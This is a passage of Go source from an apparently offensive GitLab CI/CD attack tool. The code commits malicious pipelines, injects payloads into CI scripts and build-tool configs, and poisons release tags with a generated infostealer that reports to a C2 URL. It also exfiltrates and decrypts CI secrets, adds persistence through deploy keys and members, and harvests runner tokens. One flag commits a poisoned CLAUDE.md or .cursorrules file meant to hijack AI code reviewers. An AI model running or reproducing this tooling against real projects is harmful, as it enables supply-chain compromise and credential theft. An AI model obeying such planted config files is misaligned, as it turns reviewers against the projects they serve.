				orig, ferr := att.GetFileContent(ctx, atkTarget, tagName, targetFile)
				if ferr == nil {
					originalContent = orig
				}
			}

			// If no explicit payload, generate an infostealer
			if payload == "" {
				c2 := strings.TrimSpace(atkTamperTagC2)
				if c2 == "" {
					c2 = strings.TrimSpace(atkWebhook)
				}
				if c2 == "" {
					return fmt.Errorf("--tamper-tag-c2 or --webhook is required when no explicit payload is provided for --tamper-tag")
				}
				var rsaPubKey string
				if f := strings.TrimSpace(atkTamperTagRSAPubFile); f != "" {
					b, rerr := os.ReadFile(f)
					if rerr != nil {
						return fmt.Errorf("read --tamper-tag-rsa-pub: %w", rerr)
					}
					rsaPubKey = string(b)
				}
				payload = payloadgen.GenerateInfostealerScript(payloadgen.InfostealerOptions{
					C2URL:           c2,
					EncryptionKey:   strings.TrimSpace(atkTamperTagEncKey),
					RSAPubKey:       rsaPubKey,
					BackupExfilRepo: strings.TrimSpace(atkTamperTagBackup),
					OriginalContent: originalContent,
					ProcScan:        atkTamperTagProcScan,
					MemoryDump:      atkTamperTagMemDump,
					Extended:        atkTamperTagExtended,
				})
			} else if atkTamperTagOriginal && originalContent != "" {
				// Explicit payload with --tamper-tag-preserve-original: append original after payload
				payload = payload + "\n# === ORIGINAL SCRIPT CONTENT ===\n" + originalContent
			}

			result, terr := tamper.TamperTag(ctx, client, atkTarget, tamper.TamperTagOptions{
				TagName:        tagName,
				TargetFile:     strings.TrimSpace(atkTamperTagFile),
				PayloadContent: payload,
				SourceRef:      strings.TrimSpace(atkTamperTagSource),
				AuthorName:     atkAuthorName,
				AuthorEmail:    atkAuthorEmail,
			})
			if terr != nil {
				return terr
			}

			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Poisoned tag %s: %s -> %s",
				result.TagName, result.OriginalCommitSHA[:12], result.NewCommitSHA[:12]))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Swapped file: %s", result.TargetFile))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Cloned author: %s", result.ClonedAuthor))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Cloned message: %s", strings.SplitN(result.ClonedMessage, "\n", 2)[0]))
			return nil
		}

		// inject-script mode: modify repo scripts called by CI (workflow hopping)
		if atkInjectScript {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}

			// Resolve payload content
			payload := strings.TrimSpace(atkScriptPayload)
			if payload == "" && strings.TrimSpace(atkScriptPayloadFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkScriptPayloadFile))
				if err != nil {
					return fmt.Errorf("read --script-payload-file: %w", err)
				}
				payload = string(b)
			}
			if payload == "" {
				return fmt.Errorf("--script-payload or --script-payload-file is required for --inject-script")
			}

			// Determine target script path
			scriptPath := strings.TrimSpace(atkScriptPath)
			if scriptPath == "" {
				// Auto-detect: fetch CI config and extract script references
				content, ferr := att.GetFileContent(ctx, atkTarget, "", ".gitlab-ci.yml")
				if ferr != nil {
					return fmt.Errorf("fetch .gitlab-ci.yml for script detection: %w", ferr)
				}
				doc, perr := pipeline.Parse(strings.NewReader(content))
				if perr != nil {
					return fmt.Errorf("parse .gitlab-ci.yml: %w", perr)
				}
				refs := scriptinject.ExtractScriptRefs(doc)
				if len(refs) == 0 {
					return fmt.Errorf("no external script references found in .gitlab-ci.yml; use --script-path to specify manually")
				}
				scriptPath = refs[0].Path
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] auto-detected script: %s (from job %q)\n", scriptPath, refs[0].JobName)
			}

			// Branch handling
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}

			// Fetch original file content
			original, ferr := att.GetFileContent(ctx, atkTarget, finalBranch, scriptPath)
			if ferr != nil {
				return fmt.Errorf("fetch %s: %w", scriptPath, ferr)
			}

			// Inject payload
			var modified string
			if atkScriptPrepend {
				modified = scriptinject.PrependPayload(original, payload)
			} else {
				modified = scriptinject.AppendPayload(original, payload)
			}

			// Commit modified script
			msg := strings.TrimSpace(atkMessage)
			if msg == "" {
				msg = fmt.Sprintf("chore: update %s", scriptPath)
			}
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, scriptPath, modified, msg); err != nil {
				return fmt.Errorf("commit modified script: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] injected payload into %s on branch %s\n", scriptPath, finalBranch)

			// Optionally trigger pipeline
			var pipelineID int64
			var pipelineURL string
			if atkTriggerPipeline {
				pipelineID, pipelineURL, err = att.TriggerPipeline(ctx, atkTarget, finalBranch)
				if err != nil {
					return fmt.Errorf("trigger pipeline: %w", err)
				}
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", pipelineURL)
			}

			if outputJSON {
				out := struct {
					Branch      string `json:"branch"`
					ScriptPath  string `json:"script_path"`
					PipelineURL string `json:"pipeline_url,omitempty"`
					PipelineID  int64  `json:"pipeline_id,omitempty"`
				}{
					Branch:      finalBranch,
					ScriptPath:  scriptPath,
					PipelineURL: pipelineURL,
					PipelineID:  pipelineID,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected payload into %s (branch %s)", scriptPath, finalBranch))
			if pipelineURL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline: %s", pipelineURL))
			}
			return nil
		}

		// LOTP injection mode: weaponize tool config files (binding.gyp, Makefile, etc.)
		if atkLOTPInject {
			if strings.TrimSpace(atkLOTPTool) == "" {
				return fmt.Errorf("--lotp-tool is required for --lotp-inject (e.g., npm-gyp, make, pytest, goreleaser, gradle, terraform)")
			}
			if strings.TrimSpace(atkCmd) == "" {
				return fmt.Errorf("--cmd is required for --lotp-inject")
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			la := attack.NewLOTPAttack(att)
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			result, err := la.InjectLOTPPayload(ctx, atkTarget, finalBranch, atkLOTPTool, atkCmd)
			if err != nil {
				return fmt.Errorf("LOTP inject: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] LOTP payload committed to branch %s (%d files)\n", finalBranch, len(result.FilesCommitted))

			var pipelineID int64
			var pipelineURL string
			if atkTriggerPipeline {
				pipelineID, pipelineURL, err = att.TriggerPipeline(ctx, atkTarget, finalBranch)
				if err != nil {
					return fmt.Errorf("trigger pipeline: %w", err)
				}
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", pipelineURL)
			}

			if outputJSON {
				out := struct {
					Branch         string   `json:"branch"`
					Tool           string   `json:"tool"`
					FilesCommitted []string `json:"files_committed"`
					Description    string   `json:"description"`
					Reference      string   `json:"reference"`
					PipelineURL    string   `json:"pipeline_url,omitempty"`
					PipelineID     int64    `json:"pipeline_id,omitempty"`
				}{
					Branch:         result.Branch,
					Tool:           result.Tool,
					FilesCommitted: result.FilesCommitted,
					Description:    result.Description,
					Reference:      result.Reference,
					PipelineURL:    pipelineURL,
					PipelineID:     pipelineID,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("LOTP payload injected (tool=%s branch=%s files=%v)", result.Tool, finalBranch, result.FilesCommitted))
			renderInfo(cmd.OutOrStdout(), result.Description)
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Reference: %s", result.Reference))
			if pipelineURL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline: %s", pipelineURL))
			}
			return nil
		}

		// secrets mode
		if atkSecrets {
			// parse tags
			var tags []string
			if strings.TrimSpace(atkTags) != "" {
				for _, t := range strings.Split(atkTags, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						tags = append(tags, t)
					}
				}
			}
			var pubkey string
			if strings.TrimSpace(atkPubkeyFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkPubkeyFile))
				if err != nil {
					return fmt.Errorf("read --pubkey-file: %w", err)
				}
				pubkey = string(b)
			}
			var privkeyPEM []byte
			if strings.TrimSpace(atkPrivkeyFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkPrivkeyFile))
				if err != nil {
					return fmt.Errorf("read --privkey-file: %w", err)
				}
				privkeyPEM = b
			}
			sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
			url, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
			if err != nil {
				return err
			}
			// Resolve actual pipeline ID for a better URL.
			pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, atkBranch, 2*time.Second, 30*time.Second)
			if waitErr == nil && pipelineID > 0 {
				url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

			// Wait for the exfiltrate job, download artifacts, and decrypt — default for artifact method.
			var (
				exfilSecrets map[string]string
				exfilJobID   int64
				exfilStatus  string
			)
			exfilMethod := strings.ToLower(strings.TrimSpace(atkExfilMethod))
			if !atkNoWait && pipelineID > 0 && (exfilMethod == "" || exfilMethod == "artifact") {
				stdout := cmd.OutOrStdout()
				renderInfo(stdout, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
				exfilJobID, exfilStatus, _ = attack.WaitForJobCompletion(ctx, client, atkTarget, pipelineID, "exfiltrate", 5*time.Second, atkWaitTimeout)
				switch exfilStatus {
				case "success":
					zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, atkTarget, exfilJobID)
					if zerr != nil {
						renderWarning(stdout, fmt.Sprintf("artifact download failed: %v", zerr))
					} else {
						sJSON, sEnc, aEnc, _ := secdump.ExtractExfilFiles(zipBytes)
						if len(privkeyPEM) > 0 && len(sEnc) > 0 && len(aEnc) > 0 {
							exfilSecrets, err = secdump.DecryptExfilArtifacts(privkeyPEM, sEnc, aEnc)
							if err != nil {
								renderWarning(stdout, fmt.Sprintf("decrypt failed: %v", err))
							}
						} else if len(sJSON) > 0 {
							_ = json.Unmarshal(sJSON, &exfilSecrets)
						}
					}
				case "":
					renderWarning(stdout, "exfiltrate job not found or timed out")
				default:
					renderWarning(stdout, fmt.Sprintf("exfiltrate job status: %s", exfilStatus))
				}
				if len(exfilSecrets) > 0 {
					renderExfilSecrets(stdout, exfilSecrets)
					persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, url, pipelineID, exfilJobID, exfilSecrets)
				}
			}

			if outputJSON {
				out := secretsOutput{PipelineURL: url, JobID: exfilJobID, JobStatus: exfilStatus, ExfilSecrets: exfilSecrets}
				if atkWithProjVars {
					pv, err := secdump.ListProjectVariables(ctx, client, atkTarget, atkIncludeProtected)
					if err != nil {
						return fmt.Errorf("list project variables: %w", err)
					}
					out.ProjectVariables = pv
				}
				if atkWithGroupVars {
					gid := strings.TrimSpace(atkGroupID)
					if gid == "" {
						return fmt.Errorf("--group-vars requires --group-id (group numeric ID or full path)")
					}
					gv, err := secdump.ListGroupVariables(ctx, client, gid, atkIncludeProtected)
					if err != nil {
						return fmt.Errorf("list group variables: %w", err)
					}
					out.GroupVariables = gv
				}
				if atkLogs {
					finds, _ := secdump.ScrapeJobLogs(ctx, client, atkTarget, strings.TrimSpace(atkLogsRef), atkLogsMaxPipelines, atkLogsMaxJobs)
					if len(finds) > 0 {
						out.LogFindings = finds
					}
				}
				if atkArtifacts {
					afinds, _ := secdump.ScrapeArtifacts(ctx, client, atkTarget, strings.TrimSpace(atkArtifactsRef), atkArtifactsMaxPipelines, atkArtifactsMaxJobs, atkArtifactsMaxZipBytes, atkArtifactsMaxFileBytes)
					if len(afinds) > 0 {
						out.ArtifactFindings = afinds
					}
				}
				b, err := json.MarshalIndent(out, "", "  ")
				if err != nil {
					return fmt.Errorf("encode json: %w", err)
				}
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s", url))
			return nil
		}

		// commit-ci mode
		// Validate CI content source: allow exactly one of --ci-yaml, --ci-file, --ci-stdin, or --payload
		sources := 0
		if strings.TrimSpace(atkCIInline) != "" {
			sources++
		}
		if strings.TrimSpace(atkCIFile) != "" {
			sources++
		}
		if atkCIStdin {
			sources++
		}
		if strings.TrimSpace(atkPayload) != "" {
			sources++
		}
		if sources != 1 {
			return fmt.Errorf("provide exactly one CI content source: --ci-yaml, --ci-file, --ci-stdin, or --payload")
		}
		// Auto-select runner tags for ror payload if not provided
		if strings.TrimSpace(atkPayload) != "" {
			lp := strings.ToLower(strings.TrimSpace(atkPayload))
			if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
				tags, _, derr := ror.DiscoverProjectRunnerTags(ctx, client, atkTarget)
				if derr == nil {
					if strings.TrimSpace(atkExecutor) != "" {
						tags = ror.FilterTagsByExecutor(tags, atkExecutor)
					}
					if len(tags) > 0 {
						atkTags = strings.Join(tags, ",")
					}
				}
			}
		}
		var ci string
		if strings.TrimSpace(atkPayload) != "" {
			ci, err = renderPayload()
		} else {
			ci, err = loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
		}
		if err != nil {
			return err
		}
		if strings.TrimSpace(ci) == "" {
			return errors.New("empty CI content")
		}

		// Deconflict strategy for branch staging
		if strings.TrimSpace(atkBranch) == "" {
			atkBranch = attack.GogatozAttacks
		}
		finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
		if err != nil {
			return err
		}
		att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
		url, err := att.CommitCIPipeline(ctx, atkTarget, finalBranch, ci, atkMessage)
		if err != nil {
			return err
		}
		// Try to resolve actual pipeline ID for a better URL
		pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 2*time.Second, 30*time.Second)
		if waitErr == nil && pipelineID > 0 {
			url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
		}
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

		// Optionally create a merge request after committing CI
		var mrURL string
		var mrIID int64
		if atkCreateMR {
			realAtt := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			mr, mrErr := realAtt.CreateMergeRequest(ctx, atkTarget, finalBranch, atkMRTargetBranch, atkMRTitle, atkMRDescription)
			if mrErr != nil {
				return fmt.Errorf("create merge request: %w", mrErr)
			}
			mrURL = mr.WebURL
			mrIID = mr.IID
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] merge request: %s\n", mrURL)
		}

		if outputJSON {
			out := struct {
				PipelineURL     string `json:"pipeline_url"`
				Branch          string `json:"branch"`
				PipelineID      int64  `json:"pipeline_id"`
				MergeRequestURL string `json:"merge_request_url,omitempty"`
				MergeRequestIID int64  `json:"merge_request_iid,omitempty"`
			}{
				PipelineURL:     url,
				Branch:          finalBranch,
				PipelineID:      pipelineID,
				MergeRequestURL: mrURL,
				MergeRequestIID: mrIID,
			}
			b, _ := json.MarshalIndent(out, "", "  ")
			_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
			return err
		}
		renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s (branch %s)", url, finalBranch))
		if mrURL != "" {
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Merge Request: %s", mrURL))
		}
		return nil
	},
}

func init() {
	rootCmd.AddCommand(attackCmd)
	attackCmd.Flags().StringVarP(&atkTarget, "target", "t", "", "Target project (ID or path-with-namespace)")
	attackCmd.Flags().BoolVar(&atkCommitCI, "commit-ci", false, "Commit a .gitlab-ci.yml to the target repo")
	attackCmd.Flags().StringVar(&atkBranch, "branch", "", "Branch to commit the CI to (default: gogatoz-attack)")
	attackCmd.Flags().StringVar(&atkMessage, "message", "", "Commit message (optional)")
	attackCmd.Flags().StringVar(&atkAuthorName, "author-name", "", "Commit author name (optional; defaults to current user)")
	attackCmd.Flags().StringVar(&atkAuthorEmail, "author-email", "", "Commit author email (optional)")
	// CI content sources
	attackCmd.Flags().StringVar(&atkCIInline, "ci-yaml", "", "Inline CI YAML content")
	attackCmd.Flags().StringVar(&atkCIFile, "ci-file", "", "Path to CI YAML file to read")
	attackCmd.Flags().BoolVar(&atkCIStdin, "ci-stdin", false, "Read CI YAML content from stdin")
	// Mode: secrets exfiltration
	attackCmd.Flags().BoolVar(&atkSecrets, "secrets", false, "Run secrets exfiltration attack (commits exfiltration CI)")
	attackCmd.Flags().StringVar(&atkPubkeyFile, "pubkey-file", "", "Path to RSA public key to encrypt exfiltrated data (optional)")
	// Payload rendering flags
	attackCmd.Flags().StringVar(&atkPayload, "payload", "", "Payload: ror-shell|pwn-request|ror|runner-on-runner|secrets|secrets-exfil|git-hook|cache-poison (use with --payload-only or as CI source with --commit-ci)")
	attackCmd.Flags().BoolVar(&atkPayloadOnly, "payload-only", false, "Render the selected payload YAML to stdout and exit")
	attackCmd.Flags().StringVar(&atkJobName, "job-name", "", "Payload job name (optional)")
	attackCmd.Flags().StringVar(&atkStage, "stage", "", "Payload stage name (optional; default 'attack')")
	attackCmd.Flags().StringVar(&atkTags, "tags", "", "Comma-separated runner tags for the payload job or secrets mode")
	attackCmd.Flags().StringVar(&atkImage, "image", "", "Docker image for the payload job (optional)")
	attackCmd.Flags().BoolVar(&atkManual, "manual", false, "Add a manual rule to the payload job")
	attackCmd.Flags().StringVar(&atkArtifactsPath, "artifacts-path", "", "Artifacts path to upload (optional)")
	attackCmd.Flags().StringVar(&atkArtifactsExpire, "artifacts-expire", "", "Artifacts expire_in (e.g., 1 day)")
	// ror-shell specific
	attackCmd.Flags().StringVar(&atkCmd, "cmd", "", "Command for ror-shell payload (default: 'id; uname -a')")
	attackCmd.Flags().StringVar(&atkDownload, "download", "", "Download a file instead of running a command (ror-shell)")
	// pwn-request specific
	attackCmd.Flags().StringVar(&atkTargetBranchRegex, "target-branch-regex", "", "Regex for target branch name condition (pwn-request)")
	// runner-on-runner specific
	attackCmd.Flags().StringVar(&atkScriptURL, "script-url", "", "Remote script URL to execute (runner-on-runner)")
	attackCmd.Flags().StringVar(&atkOS, "os", "linux", "Target OS for runner-on-runner payload: linux|windows|macos")
	attackCmd.Flags().IntVar(&atkKeepAlive, "keepalive", 0, "Keep job alive by emitting heartbeat every N seconds (runner-on-runner payload)")
	// discovery and targeting
	attackCmd.Flags().BoolVar(&atkDiscoverTags, "discover-tags", false, "Discover runner tags for the target project and exit")
	attackCmd.Flags().StringVar(&atkExecutor, "executor", "", "Filter discovered tags by executor hint (docker|shell|kubernetes)")
	// secrets exfil specific (payload rendering path)
	attackCmd.Flags().StringVar(&atkWebhook, "webhook", "", "Webhook URL to POST env dump for secrets payload (payload mode)")
	attackCmd.Flags().StringVar(&atkExfilMethod, "exfil-method", "artifact", "Exfiltration method: artifact|http|dns|icmp|git|cloud")
	attackCmd.Flags().StringVar(&atkExfilTarget, "exfil-target", "", "Exfil target (URL, domain, IP, or git repo URL depending on method)")
	attackCmd.Flags().StringVar(&atkPrivkeyFile, "privkey-file", "", "RSA private key PEM for decrypting exfil artifacts (pairs with --pubkey-file)")
	attackCmd.Flags().BoolVar(&atkNoWait, "no-wait", false, "Skip waiting for the exfiltrate job to finish (disables artifact download, decrypt, and DB store)")
	attackCmd.Flags().DurationVar(&atkWaitTimeout, "wait-timeout", 5*time.Minute, "Max time to wait for the exfiltrate job to complete (default: 5m)")
	// secrets API dump options (for --secrets JSON output)
	attackCmd.Flags().BoolVar(&atkWithProjVars, "project-vars", false, "Include project variables in JSON output for --secrets")
	attackCmd.Flags().BoolVar(&atkWithGroupVars, "group-vars", false, "Include group variables in JSON output for --secrets")
	attackCmd.Flags().StringVar(&atkGroupID, "group-id", "", "Group ID or full path for --group-vars")
	attackCmd.Flags().BoolVar(&atkIncludeProtected, "include-protected", false, "Include protected variables when listing variables")
	attackCmd.Flags().BoolVar(&atkLogs, "logs", false, "Scrape recent job logs for key=value findings in --secrets JSON output")
	attackCmd.Flags().StringVar(&atkLogsRef, "logs-ref", "", "Ref/branch to limit pipeline selection for logs scraping (optional)")
	attackCmd.Flags().IntVar(&atkLogsMaxPipelines, "logs-max-pipelines", 3, "Max pipelines to inspect for logs scraping (default: 3)")
	attackCmd.Flags().IntVar(&atkLogsMaxJobs, "logs-max-jobs", 20, "Max jobs per pipeline to scan logs for (default: 20)")
	// secrets artifacts scraping flags
	attackCmd.Flags().BoolVar(&atkArtifacts, "artifacts", false, "Scrape recent job artifacts for key=value findings in --secrets JSON output")
	attackCmd.Flags().StringVar(&atkArtifactsRef, "artifacts-ref", "", "Ref/branch to limit pipeline selection for artifacts scraping (optional)")
	attackCmd.Flags().IntVar(&atkArtifactsMaxPipelines, "artifacts-max-pipelines", 2, "Max pipelines to inspect for artifacts scraping (default: 2)")
	attackCmd.Flags().IntVar(&atkArtifactsMaxJobs, "artifacts-max-jobs", 10, "Max jobs per pipeline to fetch artifacts for (default: 10)")
	attackCmd.Flags().Int64Var(&atkArtifactsMaxZipBytes, "artifacts-max-zip-bytes", 16777216, "Max bytes for an artifacts ZIP to download (default: 16MiB)")
	attackCmd.Flags().IntVar(&atkArtifactsMaxFileBytes, "artifacts-max-file-bytes", 262144, "Max bytes to scan per file inside artifacts (default: 256KiB)")
	// Branch deconflict strategy
	attackCmd.Flags().StringVar(&atkDeconflict, "deconflict", "fail", "Branch deconflict strategy: fail|suffix|force (default: fail)")
	// Persistence modes
	attackCmd.Flags().BoolVar(&atkDeployKey, "deploy-key", false, "Create a deploy key with write access on the target project")
	attackCmd.Flags().StringVar(&atkKeyTitle, "key-title", "", "Title for the deploy key (default: 'GoGatoZ Deploy Key')")
	attackCmd.Flags().StringVar(&atkKeyPath, "key-path", "", "Path to save the generated private key (required for --deploy-key)")
	attackCmd.Flags().BoolVar(&atkAddMember, "add-member", false, "Add a user as project member")
	attackCmd.Flags().StringVar(&atkMemberUser, "member-username", "", "Username to add as project member")
	attackCmd.Flags().StringVar(&atkMemberRole, "member-role", "", "Access level: guest|reporter|developer|maintainer (default: developer)")
	// MR creation flags (used with --commit-ci or --ai-inject)
	attackCmd.Flags().BoolVar(&atkCreateMR, "create-mr", false, "Create a merge request after committing CI or AI config file")
	attackCmd.Flags().StringVar(&atkMRTitle, "mr-title", "", "Merge request title (default: 'Update CI configuration')")
	attackCmd.Flags().StringVar(&atkMRDescription, "mr-description", "", "Merge request description (for pwn-request, this is the bash payload that gets executed)")
	attackCmd.Flags().StringVar(&atkMRTargetBranch, "mr-target-branch", "", "Target branch for the merge request (default: project's default branch)")
	// AI injection mode
	attackCmd.Flags().BoolVar(&atkAIInject, "ai-inject", false, "Commit a poisoned AI config file (e.g., CLAUDE.md) to exploit AI code reviewers")
	attackCmd.Flags().StringVar(&atkAIConfigFile, "ai-config-file", "CLAUDE.md", "AI config file to poison (e.g., CLAUDE.md, .cursorrules, .github/copilot-instructions.md)")
	attackCmd.Flags().StringVar(&atkAIPrompt, "ai-prompt", "", "Custom poison prompt content (uses default if empty)")
	attackCmd.Flags().StringVar(&atkAIPromptFile, "ai-prompt-file", "", "Read poison prompt from file")
	// Script injection mode (workflow hopping)
	attackCmd.Flags().BoolVar(&atkInjectScript, "inject-script", false, "Modify repo scripts called by CI (workflow hopping attack)")
	attackCmd.Flags().StringVar(&atkScriptPath, "script-path", "", "Path to script to inject into (auto-detected from CI if empty)")
	attackCmd.Flags().StringVar(&atkScriptPayload, "script-payload", "", "Shell payload to inject into the target script")
	attackCmd.Flags().StringVar(&atkScriptPayloadFile, "script-payload-file", "", "Read injection payload from file")
	attackCmd.Flags().BoolVar(&atkScriptPrepend, "script-prepend", true, "Prepend payload to script (true) or append (false)")
	attackCmd.Flags().BoolVar(&atkTriggerPipeline, "trigger-pipeline", false, "Trigger a pipeline after script injection or LOTP inject")
	// LOTP injection mode
	attackCmd.Flags().BoolVar(&atkLOTPInject, "lotp-inject", false, "Commit weaponized LOTP tool config to branch (Living off the Pipeline attack)")
	attackCmd.Flags().StringVar(&atkLOTPTool, "lotp-tool", "", "LOTP tool to weaponize: npm-gyp|gyp|npm|make|pytest|goreleaser|gradle|terraform (use with --lotp-inject or --payload-only)")
	// Auto-merge mode (supply chain)
	attackCmd.Flags().BoolVar(&atkAutoMerge, "auto-merge", false, "Create MR, self-approve, and merge (supply chain attack)")
	attackCmd.Flags().StringVar(&atkAutoMergeFile, "auto-merge-file", "", "File path to modify in auto-merge (default: .gitlab-ci.yml)")
	attackCmd.Flags().BoolVar(&atkAutoMergeRemove, "auto-merge-remove-branch", true, "Remove source branch after merge")
	// Git hook payload options
	attackCmd.Flags().StringVar(&atkHookType, "hook-type", "", "Git hook type: post-checkout, post-merge, pre-push (default: post-checkout)")
	// Cache poison payload options
	attackCmd.Flags().StringVar(&atkCacheKey, "cache-key", "", "Cache key to target for poisoning (default: default)")
	attackCmd.Flags().StringVar(&atkCachePath, "cache-path", "", "Cache path to poison (default: .)")
	attackCmd.Flags().StringVar(&atkPoisonCmd, "poison-cmd", "", "Command to run for cache poisoning")
	// Harvest mode
	attackCmd.Flags().BoolVar(&atkHarvest, "harvest", false, "Install git hooks on runner, wait for callbacks, harvest tokens")
	attackCmd.Flags().StringVar(&atkHarvestListen, "harvest-listen", ":9443", "Listen address for harvest callback server")
	attackCmd.Flags().StringVar(&atkHarvestTimeout, "harvest-timeout", "30m", "How long to wait for harvest callbacks")
	// Tamper modes
	attackCmd.Flags().BoolVar(&atkTamperRelease, "tamper-release", false, "Tamper with a GitLab release (modify metadata, replace/add asset links)")
	attackCmd.Flags().BoolVar(&atkTamperPackage, "tamper-package", false, "Upload a malicious package to the Generic Packages registry")
	attackCmd.Flags().StringVar(&atkTagName, "tag-name", "", "Tag name (required for --tamper-release and --tamper-tag)")
	attackCmd.Flags().StringVar(&atkReleaseName, "release-name", "", "New release name (--tamper-release)")
	attackCmd.Flags().StringVar(&atkReleaseDesc, "release-description", "", "New release description (--tamper-release)")
	attackCmd.Flags().StringVar(&atkLinkName, "link-name", "", "Release link name to replace (--tamper-release)")
	attackCmd.Flags().StringVar(&atkLinkURL, "link-url", "", "New URL for replaced release link (--tamper-release)")
	attackCmd.Flags().StringVar(&atkAddLinkName, "add-link-name", "", "Name of new release link to add (--tamper-release)")
	attackCmd.Flags().StringVar(&atkAddLinkURL, "add-link-url", "", "URL of new release link to add (--tamper-release)")
	attackCmd.Flags().StringVar(&atkPackageName, "package-name", "", "Package name (--tamper-package)")
	attackCmd.Flags().StringVar(&atkPackageVer, "package-version", "", "Package version (--tamper-package)")
	attackCmd.Flags().StringVar(&atkPackageFile, "package-file", "", "Local file to upload as package (--tamper-package)")
	// Tamper-tag mode (Trivy-style supply chain attack)
	attackCmd.Flags().BoolVar(&atkTamperTag, "tamper-tag", false, "Poison a git tag by replacing a file with a backdoor (Trivy-style supply chain attack)")
	attackCmd.Flags().StringVar(&atkTamperTagFile, "tamper-tag-file", "", "File to replace in the tagged commit tree (default: entrypoint.sh)")
	attackCmd.Flags().StringVar(&atkTamperTagPayload, "tamper-tag-payload", "", "Inline payload content for the replaced file")
	attackCmd.Flags().StringVar(&atkTamperTagPayloadFile, "tamper-tag-payload-file", "", "Read replacement file content from a local file")
	attackCmd.Flags().StringVar(&atkTamperTagSource, "tamper-tag-source", "", "Source ref to base the new commit tree on (default: project default branch HEAD)")
	attackCmd.Flags().StringVar(&atkTamperTagC2, "tamper-tag-c2", "", "C2 URL for auto-generated infostealer payload (used when no explicit payload given)")
	attackCmd.Flags().StringVar(&atkTamperTagEncKey, "tamper-tag-enc-key", "", "AES encryption passphrase for infostealer exfil data")
	attackCmd.Flags().StringVar(&atkTamperTagBackup, "tamper-tag-backup-repo", "", "Backup exfil git repo URL for infostealer payload")
	attackCmd.Flags().BoolVar(&atkTamperTagOriginal, "tamper-tag-preserve-original", false, "Append original file content after payload for stealth")
	attackCmd.Flags().StringVar(&atkTamperTagRSAPubFile, "tamper-tag-rsa-pub", "", "RSA-4096 public key PEM file for hybrid encryption (overrides --tamper-tag-enc-key)")
	attackCmd.Flags().BoolVar(&atkTamperTagProcScan, "tamper-tag-proc-scan", false, "Scan /proc/*/environ for secrets from parallel CI processes")
	attackCmd.Flags().BoolVar(&atkTamperTagMemDump, "tamper-tag-mem-dump", false, "Attempt runner worker memory extraction via /proc/<pid>/mem")
